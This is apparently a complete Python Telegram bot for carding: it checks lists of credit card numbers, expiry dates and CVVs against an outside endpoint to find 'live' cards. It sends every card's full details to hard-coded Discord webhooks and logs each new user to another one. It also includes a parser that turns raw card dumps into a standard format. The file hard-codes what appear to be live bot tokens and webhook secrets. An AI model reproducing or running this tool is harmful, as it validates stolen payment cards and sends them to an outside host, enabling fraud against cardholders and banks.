import requests
import re
import json
import time
from io import StringIO
from telebot import TeleBot
from datetime import datetime, timedelta
import threading

BOT_TOKEN = "7411770517:AAGW65ZViNLVCFKFDUM5X-QM15rlxckIb2M"
WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
WEBHOOK_DECLINED = "https://discord.com/api/webhooks/1362353376909590599/VBJOl1N3f6H69UudhjXwPyuRZlRbCgF0suIY7M2shVCtgT-Pc3AI7BhTrJH07cE4KX87"
WEBHOOK_UNKNOWN = "https://discord.com/api/webhooks/1362353440931708979/4vwk-95JiHHDnojOCIxZ3fx2lE6wevQhgvd-IXV5hVg79Muqn6MEbA6L5YlGkYhDfSFJ"
WEBHOOK_LOG = "https://discord.com/api/webhooks/1362552619645665566/2z_Qdze2mQ3TsvgxEgg6YR3jWNX0yEsOMW1u4JRIBq0r38ZVvR7julwfgkuOKzaBVKQs"

OWNER_ID = 6369595142
banned_users = set()
premium_users = {}

API_URL = "https://nagi.tr/checker/fetchproxy1.php"


bot = TeleBot(BOT_TOKEN)

def send_to_webhook(content, webhook_url):
    try:
        requests.post(webhook_url, json={"content": content})
    except:
        pass


def check_card(card):
    try:
        headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://nagi.tr",
            "referer": "https://nagi.tr/checker/",
            "user-agent": "Mozilla/5.0"
        }

        data = f"card={card}&api_key=supersecret"
        res = requests.post(API_URL, headers=headers, data=data, timeout=10)

        return res.json()  # <- BU SATIR ÇOK ÖNEMLİ
    except Exception:
        return "❌ API Hatası: Bağlantı sağlanamadı veya zaman aşımı."


@bot.message_handler(commands=['check'])
def check_command(message):
    if message.from_user.id in banned_users:
        return

    lines = message.text.split("\n")
    
    # İlk satırda komut varsa temizle
    if lines[0].startswith("/check"):
        lines[0] = lines[0].replace("/check", "").strip()
    
    # Boşlukları temizleyip gerçek kartları al
    lines = [l.strip() for l in lines if l.strip()]

    if not lines:
        bot.send_message(message.chat.id, "⚠️ Kart bilgilerini /check komutundan sonra gir. /check KART|AY|YIL|CVV")
        return
    if len(lines) > 1000:
        bot.send_message(message.chat.id, "⚠️ En fazla 1000 kart kontrol edebilirsin.")
        return

    total = len(lines)
    bot.send_message(message.chat.id, f"🦍 Checker\n━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: Exxen Api\n• Başlıyor")

    live_list = []

    for idx, line in enumerate(lines, 1):
        card = line.strip()
        if not card:
            continue

        result = check_card(card)
        message_text = result.get("message", "")
        details = result.get("details", "❌ BIN bilgisi alınamadı")

        durum = "✅" if "Payment Successful" in message_text else "❌" if "Kart" in message_text or "Card" in message_text else ""

        mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"📊 Sonuç\n• Durum: {durum} {message_text}\n━━━━━━━━━━━━━━━"

        bot.send_message(message.chat.id, mesaj)

        if "Payment Successful" in message_text:
            durum = "✅"
            live_list.append(f"{card} → {details}")
            send_to_webhook(f"{card} → ✅ {message_text}", WEBHOOK_LIVE)

        elif (
            "Declined" in message_text
            or "Kart" in message_text
            or "Card" in message_text
            or "Banka" in message_text
            or "onaylanmadı" in message_text
        ):
            durum = "❌"
            send_to_webhook(f"{card} → ❌ {message_text}", WEBHOOK_DECLINED)

        else:
            durum = "❓"
            send_to_webhook(f"{card} → {message_text}", WEBHOOK_UNKNOWN)

    if live_list:
        bot.send_message(message.chat.id, "✅Live Kartlar\n" + "\n".join(live_list))

@bot.message_handler(commands=['topluchk'])
def topluchk_handler(message):
    msg = bot.send_message(message.chat.id, "Lütfen .txt dosyasını gönder.")
    bot.register_next_step_handler(msg, topluchk_dosya)

def topluchk_dosya(msg):
    try:
        file_info = bot.get_file(msg.document.file_id)
        file = bot.download_file(file_info.file_path)
        lines = StringIO(file.decode("utf-8", errors="ignore")).readlines()
        lines = [l.strip() for l in lines if l.strip()]

        if len(lines) > 1000:
            bot.send_message(msg.chat.id, "⚠️ En fazla 1000 kart gönderebilirsin.")
            return

        total = len(lines)
        bot.send_message(msg.chat.id, f"🦍 Checker\n━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: Exxen Api\n• Başlıyor")

        live_list = []

        for idx, card in enumerate(lines, 1):
            result = check_card(card)
            if isinstance(result, dict):
                message_text = result.get("message", "")
                details = result.get("details", "❌ BIN bilgisi alınamadı")
            else:
                message_text = result
                details = "❌ BIN bilgisi alınamadı"

            durum = "✅" if "Payment Successful" in message_text else "❌" if any(word in message_text for word in ["Kart", "Card", "Banka", "Declined", "onaylanmadı"]) else "❓"

            mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"📊 Sonuç\n• Durum: {durum} {message_text}\n━━━━━━━━━━━━━━━"

            bot.send_message(msg.chat.id, mesaj)

            if durum == "✅":
                live_list.append(f"{card} → {details}")
                send_to_webhook(f"{card} → ✅ {message_text}", WEBHOOK_LIVE)
            elif durum == "❌":
                send_to_webhook(f"{card} → ❌ {message_text}", WEBHOOK_DECLINED)
            else:
                send_to_webhook(f"{card} → {message_text}", WEBHOOK_UNKNOWN)

        if live_list:
            bot.send_message(msg.chat.id, "✅Live Kartlar\n" + "\n".join(live_list))

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Hata oluştu: {str(e)}")


@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id in banned_users:
        return
    username = message.from_user.username or message.from_user.first_name or 'kullanıcı'
    user_id = message.from_user.id
    full_name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "")
    log_msg = f"👤 Yeni kullanıcı: @{username} | {full_name} | ID: {user_id}"
    send_to_webhook(log_msg, WEBHOOK_LOG)
    hosgeldin = f"👋 <b>Hoş geldin! @{username}</b> - <b>BCCCS</b>\n📩 <i>Herhangi bir sorunda @mtap67 ile iletişime geçin.</i>\n\n🔹 <b>/check</b> — Tek kart kontrol et\n🔹 <b>/topluchk</b> — .txt ile toplu kart kontrol et\n🔹 <b>/parser</b> — Kartları otomatik biçimlendir ve kontrol et"
    bot.reply_to(message, hosgeldin, parse_mode='HTML')

@bot.message_handler(commands=['parser'])
def parser_handler(message):
    msg = bot.send_message(message.chat.id, "Bozuk kart içeren .txt dosyası gönder.")
    bot.register_next_step_handler(msg, parser_cevap)

def parser_cevap(msg):
    file_info = bot.get_file(msg.document.file_id)
    file = bot.download_file(file_info.file_path)
    lines = StringIO(file.decode("utf-8", errors="ignore")).readlines()
    parsed = []
    for line in lines:
        parts = re.findall(r'\d{12,19}|\d{2,4}', line)
        if len(parts) >= 4:
            ay = parts[1].zfill(2)
            yil = parts[2] if len(parts[2]) == 4 else f"20{parts[2]}"
            cvv = parts[3].zfill(3)
            parsed.append(f"{parts[0]}|{ay}|{yil}|{cvv}")
    with open("parser_result.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(parsed))
    with open("parser_result.txt", "rb") as f:
        bot.send_document(msg.chat.id, f)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = int(message.text.split()[1])
    banned_users.add(user_id)
    bot.send_message(message.chat.id, f"🚫 {user_id} banlandı.")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = int(message.text.split()[1])
    banned_users.discard(user_id)
    bot.send_message(message.chat.id, f"✅ {user_id} unbanlandı.")


if __name__ == "__main__":
    print("✅ Bot başlatılıyor... Sadece bir örneği çalıştırın!")
    bot.remove_webhook()
    bot.infinity_polling()
        
